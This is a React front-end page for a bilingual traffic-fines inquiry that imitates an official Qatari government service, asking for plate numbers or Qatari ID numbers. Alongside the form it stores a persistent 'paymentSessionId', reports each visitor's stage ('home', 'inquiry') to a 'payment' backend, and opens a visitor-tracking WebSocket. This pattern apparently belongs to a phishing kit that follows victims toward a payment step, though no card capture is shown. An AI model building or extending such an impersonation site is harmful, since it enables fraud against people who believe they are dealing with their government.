import React, { useState, useEffect } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { nanoid } from "nanoid";

const COUNTRIES = [
  { id: "QAT", ar: "قطر", en: "Qatar" },
  { id: "SAU", ar: "المملكة العربية السعودية", en: "Saudi Arabia" },
  { id: "ARE", ar: "الإمارات العربية المتحدة", en: "United Arab Emirates" },
  { id: "KWT", ar: "الكويت", en: "Kuwait" },
  { id: "BHR", ar: "البحرين", en: "Bahrain" },
  { id: "OMN", ar: "عمان", en: "Oman" },
  { id: "EGY", ar: "مصر", en: "Egypt" },
  { id: "JOR", ar: "الأردن", en: "Jordan" },
  { id: "PSE", ar: "فلسطين", en: "Palestine" },
  { id: "IRQ", ar: "العراق", en: "Iraq" },
  { id: "LBN", ar: "لبنان", en: "Lebanon" },
  { id: "SYR", ar: "سوريا", en: "Syria" },
  { id: "YEM", ar: "اليمن", en: "Yemen" },
  { id: "LBY", ar: "ليبيا", en: "Libya" },
  { id: "SDN", ar: "السودان", en: "Sudan" },
  { id: "MAR", ar: "المغرب", en: "Morocco" },
  { id: "DZA", ar: "الجزائر", en: "Algeria" },
  { id: "TUN", ar: "تونس", en: "Tunisia" },
  { id: "MRT", ar: "موريتانيا", en: "Mauritania" },
  { id: "SOM", ar: "الصومال", en: "Somalia" },
  { id: "DJI", ar: "جيبوتي", en: "Djibouti" },
  { id: "COM", ar: "جزر القمر", en: "Comoros" },
  { id: "AFG", ar: "أفغانستان", en: "Afghanistan" },
  { id: "ALB", ar: "ألبانيا", en: "Albania" },
  { id: "AND", ar: "أندورا", en: "Andorra" },
  { id: "AGO", ar: "أنغولا", en: "Angola" },
  { id: "ATG", ar: "أنتيغوا وبربودا", en: "Antigua and Barbuda" },
  { id: "ARG", ar: "الأرجنتين", en: "Argentina" },
  { id: "ARM", ar: "أرمينيا", en: "Armenia" },
  { id: "AUS", ar: "أستراليا", en: "Australia" },
  { id: "AUT", ar: "النمسا", en: "Austria" },
  { id: "AZE", ar: "أذربيجان", en: "Azerbaijan" },
  { id: "BHS", ar: "جزر البهاما", en: "Bahamas" },
  { id: "BGD", ar: "بنغلاديش", en: "Bangladesh" },
  { id: "BRB", ar: "باربادوس", en: "Barbados" },
  { id: "BLR", ar: "بيلاروسيا", en: "Belarus" },
  { id: "BEL", ar: "بلجيكا", en: "Belgium" },
  { id: "BLZ", ar: "بليز", en: "Belize" },
  { id: "BEN", ar: "بنين", en: "Benin" },
  { id: "BTN", ar: "بوتان", en: "Bhutan" },
  { id: "BOL", ar: "بوليفيا", en: "Bolivia" },
  { id: "BIH", ar: "البوسنة والهرسك", en: "Bosnia and Herzegovina" },
  { id: "BWA", ar: "بوتسوانا", en: "Botswana" },
  { id: "BRA", ar: "البرازيل", en: "Brazil" },
  { id: "BRN", ar: "بروناي", en: "Brunei" },
  { id: "BGR", ar: "بلغاريا", en: "Bulgaria" },
  { id: "BFA", ar: "بوركينا فاسو", en: "Burkina Faso" },
  { id: "BDI", ar: "بوروندي", en: "Burundi" },
  { id: "CPV", ar: "الرأس الأخضر", en: "Cabo Verde" },
  { id: "KHM", ar: "كمبوديا", en: "Cambodia" },
  { id: "CMR", ar: "الكاميرون", en: "Cameroon" },
  { id: "CAN", ar: "كندا", en: "Canada" },
  { id: "CAF", ar: "جمهورية أفريقيا الوسطى", en: "Central African Republic" },
  { id: "TCD", ar: "تشاد", en: "Chad" },
  { id: "CHL", ar: "تشيلي", en: "Chile" },
  { id: "CHN", ar: "الصين", en: "China" },
  { id: "COL", ar: "كولومبيا", en: "Colombia" },
  { id: "COG", ar: "الكونغو", en: "Congo" },
  { id: "CRI", ar: "كوستاريكا", en: "Costa Rica" },
  { id: "HRV", ar: "كرواتيا", en: "Croatia" },
  { id: "CUB", ar: "كوبا", en: "Cuba" },
  { id: "CYP", ar: "قبرص", en: "Cyprus" },
  { id: "CZE", ar: "جمهورية التشيك", en: "Czech Republic" },
  { id: "DNK", ar: "الدنمارك", en: "Denmark" },
  { id: "DMA", ar: "دومينيكا", en: "Dominica" },
  { id: "DOM", ar: "جمهورية الدومينيكان", en: "Dominican Republic" },
  { id: "ECU", ar: "الإكوادور", en: "Ecuador" },
  { id: "SLV", ar: "السلفادور", en: "El Salvador" },
  { id: "GNQ", ar: "غينيا الاستوائية", en: "Equatorial Guinea" },
  { id: "ERI", ar: "إريتريا", en: "Eritrea" },
  { id: "EST", ar: "إستونيا", en: "Estonia" },
  { id: "SWZ", ar: "إسواتيني", en: "Eswatini" },
  { id: "ETH", ar: "إثيوبيا", en: "Ethiopia" },
  { id: "FJI", ar: "فيجي", en: "Fiji" },
  { id: "FIN", ar: "فنلندا", en: "Finland" },
  { id: "FRA", ar: "فرنسا", en: "France" },
  { id: "GAB", ar: "الغابون", en: "Gabon" },
  { id: "GMB", ar: "غامبيا", en: "Gambia" },
  { id: "GEO", ar: "جورجيا", en: "Georgia" },
  { id: "DEU", ar: "ألمانيا", en: "Germany" },
  { id: "GHA", ar: "غانا", en: "Ghana" },
  { id: "GRC", ar: "اليونان", en: "Greece" },
  { id: "GRD", ar: "غرينادا", en: "Grenada" },
  { id: "GTM", ar: "غواتيمالا", en: "Guatemala" },
  { id: "GIN", ar: "غينيا", en: "Guinea" },
  { id: "GNB", ar: "غينيا بيساو", en: "Guinea-Bissau" },
  { id: "GUY", ar: "غويانا", en: "Guyana" },
  { id: "HTI", ar: "هايتي", en: "Haiti" },
  { id: "HND", ar: "هندوراس", en: "Honduras" },
  { id: "HUN", ar: "المجر", en: "Hungary" },
  { id: "ISL", ar: "آيسلندا", en: "Iceland" },
  { id: "IND", ar: "الهند", en: "India" },
  { id: "IDN", ar: "إندونيسيا", en: "Indonesia" },
  { id: "IRN", ar: "إيران", en: "Iran" },
  { id: "IRL", ar: "أيرلندا", en: "Ireland" },
  { id: "ITA", ar: "إيطاليا", en: "Italy" },
  { id: "JAM", ar: "جامايكا", en: "Jamaica" },
  { id: "JPN", ar: "اليابان", en: "Japan" },
  { id: "KAZ", ar: "كازاخستان", en: "Kazakhstan" },
  { id: "KEN", ar: "كينيا", en: "Kenya" },
  { id: "KIR", ar: "كيريباتي", en: "Kiribati" },
  { id: "KGZ", ar: "قيرغيزستان", en: "Kyrgyzstan" },
  { id: "LAO", ar: "لاوس", en: "Laos" },
  { id: "LVA", ar: "لاتفيا", en: "Latvia" },
  { id: "LSO", ar: "ليسوتو", en: "Lesotho" },
  { id: "LBR", ar: "ليبيريا", en: "Liberia" },
  { id: "LIE", ar: "ليختنشتاين", en: "Liechtenstein" },
  { id: "LTU", ar: "ليتوانيا", en: "Lithuania" },
  { id: "LUX", ar: "لوكسمبورغ", en: "Luxembourg" },
  { id: "MDG", ar: "مدغشقر", en: "Madagascar" },
  { id: "MWI", ar: "مالاوي", en: "Malawi" },
  { id: "MYS", ar: "ماليزيا", en: "Malaysia" },
  { id: "MDV", ar: "جزر المالديف", en: "Maldives" },
  { id: "MLI", ar: "مالي", en: "Mali" },
  { id: "MLT", ar: "مالطا", en: "Malta" },
  { id: "MHL", ar: "جزر مارشال", en: "Marshall Islands" },
  { id: "MUS", ar: "موريشيوس", en: "Mauritius" },
  { id: "MEX", ar: "المكسيك", en: "Mexico" },
  { id: "FSM", ar: "ميكرونيزيا", en: "Micronesia" },
  { id: "MDA", ar: "مولدوفا", en: "Moldova" },
  { id: "MCO", ar: "موناكو", en: "Monaco" },
  { id: "MNG", ar: "منغوليا", en: "Mongolia" },
  { id: "MNE", ar: "الجبل الأسود", en: "Montenegro" },
  { id: "MOZ", ar: "موزمبيق", en: "Mozambique" },
  { id: "MMR", ar: "ميانمار", en: "Myanmar" },
  { id: "NAM", ar: "ناميبيا", en: "Namibia" },
  { id: "NRU", ar: "ناورو", en: "Nauru" },
  { id: "NPL", ar: "نيبال", en: "Nepal" },
  { id: "NLD", ar: "هولندا", en: "Netherlands" },
  { id: "NZL", ar: "نيوزيلندا", en: "New Zealand" },
  { id: "NIC", ar: "نيكاراغوا", en: "Nicaragua" },
  { id: "NER", ar: "النيجر", en: "Niger" },
  { id: "NGA", ar: "نيجيريا", en: "Nigeria" },
  { id: "PRK", ar: "كورية الشمالية", en: "North Korea" },
  { id: "MKD", ar: "مقدونيا الشمالية", en: "North Macedonia" },
  { id: "NOR", ar: "النرويج", en: "Norway" },
  { id: "PAK", ar: "باكستان", en: "Pakistan" },
  { id: "PLW", ar: "بالاو", en: "Palau" },
  { id: "PAN", ar: "بنما", en: "Panama" },
  { id: "PNG", ar: "بابوا غينيا الجديدة", en: "Papua New Guinea" },
  { id: "PRY", ar: "باراغواي", en: "Paraguay" },
  { id: "PER", ar: "بيرو", en: "Peru" },
  { id: "PHL", ar: "الفلبين", en: "Philippines" },
  { id: "POL", ar: "بولندا", en: "Poland" },
  { id: "PRT", ar: "البرتغال", en: "Portugal" },
  { id: "ROU", ar: "رومانيا", en: "Romania" },
  { id: "RUS", ar: "روسيا", en: "Russia" },
  { id: "RWA", ar: "رواندا", en: "Rwanda" },
  { id: "KNA", ar: "سانت كيتس ونيفيس", en: "Saint Kitts and Nevis" },
  { id: "LCA", ar: "سانت لوسيا", en: "Saint Lucia" },
  { id: "VCG", ar: "سانت فينسنت والغرينادين", en: "Saint Vincent and the Grenadines" },
  { id: "WSM", ar: "ساموا", en: "Samoa" },
  { id: "SMR", ar: "سان مارينو", en: "San Marino" },
  { id: "STP", ar: "ساو تومي وبرينسيب", en: "Sao Tome and Principe" },
  { id: "SEN", ar: "السنغال", en: "Senegal" },
  { id: "SRB", ar: "صربيا", en: "Serbia" },
  { id: "SYC", ar: "سيشل", en: "Seychelles" },
  { id: "SLE", ar: "سيراليون", en: "Sierra Leone" },
  { id: "SGP", ar: "سنغافورة", en: "Singapore" },
  { id: "SVK", ar: "سلوفاكيا", en: "Slovakia" },
  { id: "SVN", ar: "سلوفينيا", en: "Slovenia" },
  { id: "SLB", ar: "جزر سليمان", en: "Solomon Islands" },
  { id: "ZAF", ar: "جنوب أفريقيا", en: "South Africa" },
  { id: "KOR", ar: "كوريا الجنوبية", en: "South Korea" },
  { id: "SSD", ar: "جنوب السودان", en: "South Sudan" },
  { id: "ESP", ar: "إسبانيا", en: "Spain" },
  { id: "LKA", ar: "سريلانكا", en: "Sri Lanka" },
  { id: "SUR", ar: "سورينام", en: "Suriname" },
  { id: "SWE", ar: "السويد", en: "Sweden" },
  { id: "CHE", ar: "سويسرا", en: "Switzerland" },
  { id: "TWN", ar: "تايوان", en: "Taiwan" },
  { id: "TJK", ar: "طاجيكستان", en: "Tajikistan" },
  { id: "TZA", ar: "تنزانيا", en: "Tanzania" },
  { id: "THA", ar: "تايلاند", en: "Thailand" },
  { id: "TLS", ar: "تيمور الشرقية", en: "Timor-Leste" },
  { id: "TGO", ar: "توغو", en: "Togo" },
  { id: "TON", ar: "تونغا", en: "Tonga" },
  { id: "TTO", ar: "ترينيداد وتوباغو", en: "Trinidad and Tobago" },
  { id: "TUR", ar: "تركيا", en: "Turkey" },
  { id: "TKM", ar: "تركمانستان", en: "Turkmenistan" },
  { id: "TUV", ar: "توفالو", en: "Tuvalu" },
  { id: "UGA", ar: "أوغندا", en: "Uganda" },
  { id: "UKR", ar: "أوكرانيا", en: "Ukraine" },
  { id: "GBR", ar: "المملكة المتحدة", en: "United Kingdom" },
  { id: "USA", ar: "الولايات المتحدة الأمريكية", en: "United States" },
  { id: "URY", ar: "أوروغواي", en: "Uruguay" },
  { id: "UZB", ar: "أوزبكستان", en: "Uzbekistan" },
  { id: "VUT", ar: "فانواتو", en: "Vanuatu" },
  { id: "VAT", ar: "الفاتيكان", en: "Vatican City" },
  { id: "VEN", ar: "فنزويلا", en: "Venezuela" },
  { id: "VNM", ar: "فيتنام", en: "Vietnam" },
  { id: "ZMB", ar: "زامبيا", en: "Zambia" },
  { id: "ZWE", ar: "زيمبابوي", en: "Zimbabwe" }
];

const PLATE_TYPES = [
  { id: "1", ar: "خصوصي", en: "Private" },
  { id: "2", ar: "خصوصي (Q)", en: "Private (Q)" },
  { id: "3", ar: "خصوصي (T)", en: "Private (T)" },
  { id: "4", ar: "خصوصي (R)", en: "Private (R)" },
  { id: "5", ar: "حكومة", en: "Government" },
  { id: "6", ar: "تجارية", en: "Commercial" },
  { id: "7", ar: "نقل خاص", en: "Private Transport" },
  { id: "8", ar: "آليات", en: "Machinery" },
  { id: "9", ar: "مقطورة", en: "Trailer" },
  { id: "10", ar: "نقل عام", en: "Public Transport" },
  { id: "11", ar: "هيئة دبلوماسية", en: "Diplomatic Corps" },
  { id: "12", ar: "شرطة", en: "Police" },
  { id: "13", ar: "دراجة نارية شرطة", en: "Police Motorcycle" },
  { id: "14", ar: "دراجة نارية خصوصية", en: "Private Motorcycle" },
  { id: "15", ar: "أجرة", en: "Taxi" },
  { id: "16", ar: "سيارة لخويا", en: "Lekhwiya Car" },
  { id: "17", ar: "دراجة لخويا", en: "Lekhwiya Motorcycle" },
  { id: "18", ar: "سيارة الحرس الأميري", en: "Amiri Guard Car" },
  { id: "19", ar: "دراجة الحرس الأميري", en: "Amiri Guard Motorcycle" },
  { id: "20", ar: "ليموزين", en: "Limousine" },
  { id: "21", ar: "القوات المسلحة القطرية", en: "Qatar Armed Forces" },
  { id: "22", ar: "إدخال مؤقت", en: "Temporary Entry" },
  { id: "23", ar: "معدة", en: "Equipment" },
  { id: "24", ar: "هيئة الامم المتحدة", en: "United Nations" },
  { id: "25", ar: "تصْدير", en: "Export" },
  { id: "26", ar: "آليات حكومية", en: "Government Machinery" },
  { id: "27", ar: "تحت التجربة", en: "Under Test" },
  { id: "28", ar: "مقطورة حكومية", en: "Government Trailer" }
];

export default function Home() {
  const { lang } = useLanguage();
  const { t } = useTranslation();
  const [, setLocation] = useLocation();
  const [inquiryType, setInquiryType] = useState<"plate" | "qid" | "establishment">("plate");
  const [plateSource, setPlateSource] = useState("QAT");
  const [plateType, setPlateType] = useState("1");
  const [plateNumber, setPlateNumber] = useState("");
  const [ownerIdType, setOwnerIdType] = useState<"qid" | "establishment">("qid");
  const [ownerId, setOwnerId] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [captchaUrl, setCaptchaUrl] = useState(`/api/captcha?t=${Date.now()}`);
  const [sessionId] = useState(() => {
    const saved = localStorage.getItem("paymentSessionId");
    if (saved) return saved;
    const newId = nanoid();
    localStorage.setItem("paymentSessionId", newId);
    return newId;
  });

  const isAr = lang === "ar";
  
  const refreshCaptcha = () => {
    setCaptchaUrl(`/api/captcha?t=${Date.now()}`);
  };

  const updateStageMutation = trpc.payment.updateStage.useMutation();

  // تحديث الحالة عند الدخول
  useEffect(() => {
    updateStageMutation.mutate({ sessionId, stage: "home" });
    
    // تتبع الصفحة عبر WebSocket
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/&sessionId=${sessionId}`);
    
    return () => ws.close();
  }, []);

  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      if (data.success) {
        if (data.totalFines === 0) {
          toast.info(isAr ? "لا توجد مخالفات مسجلة" : "No violations recorded");
        } else {
          setLocation(`/violations-results?session=${data.sessionId}`);
        }
      } else {
        toast.error(data.errorMessage || (isAr ? "فشل الاستعلام" : "Query failed"));
        refreshCaptcha();
      }
    },
  });

  const handleSearch = () => {
    if (inquiryType === "plate" && !plateNumber) {
      toast.error(isAr ? "الرجاء إدخال رقم اللوحة" : "Please enter plate number");
      return;
    }
    if (!captcha) {
      toast.error(isAr ? "الرجاء إدخال رمز التحقق" : "Please enter captcha code");
      return;
    }

    updateStageMutation.mutate({ sessionId, stage: "inquiry" });
    
    queryMutation.mutate({
      sessionId,
      inquiryType,
      plateSource: inquiryType === "plate" ? plateSource : undefined,
      plateNumber: inquiryType === "plate" ? plateNumber : undefined,
      plateType: inquiryType === "plate" ? plateType : undefined,
      ownerIdType: inquiryType !== "plate" ? ownerIdType : undefined,
      ownerId: inquiryType !== "plate" ? ownerId : undefined,
      captcha,
    });
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir={isAr ? "rtl" : "ltr"}>
      <Header />
      
      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden border border-gray-100">
          <div className="bg-[#f8f9fa] p-6 border-b border-gray-200 text-center">
            <h1 className="text-xl font-bold text-[#2d3436]">{t("inquiry_title")}</h1>
          </div>
          
          <div className="p-6">
            <div className="flex gap-4 mb-8 justify-center">
              {[
                { id: "plate", icon: "/icon-plate.png", label: t("by_plate") },
                { id: "qid", icon: "/icon-qid.png", label: t("by_qid") },
                { id: "establishment", icon: "/icon-establishment.png", label: t("by_establishment") }
              ].map(type => (
                <button
                  key={type.id}
                  onClick={() => setInquiryType(type.id as any)}
                  className={`flex flex-col items-center p-4 rounded-xl border-2 transition-all w-32 ${
                    inquiryType === type.id 
                    ? "border-[#003d71] bg-[#003d71]/5 shadow-md" 
                    : "border-gray-100 hover:border-gray-200"
                  }`}
                >
                  <img src={type.icon} alt="" className="w-10 h-10 mb-2 object-contain" />
                  <span className={`text-xs font-bold ${inquiryType === type.id ? "text-[#003d71]" : "text-gray-500"}`}>
                    {type.label}
                  </span>
                </button>
              ))}
            </div>

            <div className="space-y-6">
              {inquiryType === "plate" ? (
                <>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2">{t("country")}</label>
                      <select 
                        value={plateSource}
                        onChange={e => setPlateSource(e.target.value)}
                        className="w-full border border-gray-300 rounded-lg px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
                      >
                        {COUNTRIES.map(c => (
                          <option key={c.id} value={c.id}>{isAr ? c.ar : c.en}</option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2">{t("plate_type")}</label>
                      <select 
                        value={plateType}
                        onChange={e => setPlateType(e.target.value)}
                        className="w-full border border-gray-300 rounded-lg px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
                      >
                        {PLATE_TYPES.map(p => (
                          <option key={p.id} value={p.id}>{isAr ? p.ar : p.en}</option>
                        ))}
                      </select>
                    </div>
                  </div>
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">{t("plate_number")}</label>
                    <input
                      type="text"
                      value={plateNumber}
                      onChange={e => setPlateNumber(e.target.value)}
                      placeholder={t("enter_plate")}
                      className="w-full border border-gray-300 rounded-lg px-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
                    />
                  </div>
                </>
              ) : (
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    {inquiryType === "qid" ? t("personal_id") : t("establishment_id")}
                  </label>
                  <input
                    type="text"
                    value={ownerId}
                    onChange={e => setOwnerId(e.target.value)}
                    placeholder={inquiryType === "qid" ? t("enter_qid") : t("enter_establishment")}
                    className="w-full border border-gray-300 rounded-lg px-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
                  />
                </div>
              )}

              <div className="bg-gray-50 p-4 rounded-xl border border-gray-200">
                <label className="block text-sm font-bold text-gray-700 mb-3">{t("captcha")}</label>
                <div className="flex gap-3 items-center">
                  <div className="bg-white p-2 rounded-lg border border-gray-300 shadow-sm flex-shrink-0">
                    <img src={captchaUrl} alt="captcha" className="h-10 w-32 object-contain" />
                  </div>
                  <button 
                    onClick={refreshCaptcha}
                    className="p-2 text-gray-500 hover:text-[#003d71] hover:bg-white rounded-lg transition-colors border border-transparent hover:border-gray-200"
                  >
                    🔄
                  </button>
                  <input
                    type="text"
                    value={captcha}
                    onChange={e => setCaptcha(e.target.value)}
                    className="flex-grow border border-gray-300 rounded-lg px-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
                  />
                </div>
              </div>

              <div className="flex gap-4 pt-4">
                <button
                  onClick={handleSearch}
                  disabled={queryMutation.isPending}
                  className="flex-1 bg-[#003d71] hover:bg-[#002d54] text-white py-3.5 rounded-xl font-bold shadow-lg transition-all transform hover:-translate-y-0.5 disabled:opacity-70 disabled:transform-none"
                >
                  {queryMutation.isPending ? t("searching") : t("search")}
                </button>
                <button
                  onClick={() => {
                    setPlateNumber("");
                    setOwnerId("");
                    setCaptcha("");
                  }}
                  className="flex-1 bg-white border-2 border-gray-200 text-gray-600 py-3.5 rounded-xl font-bold hover:bg-gray-50 transition-all"
                >
                  {t("clear")}
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
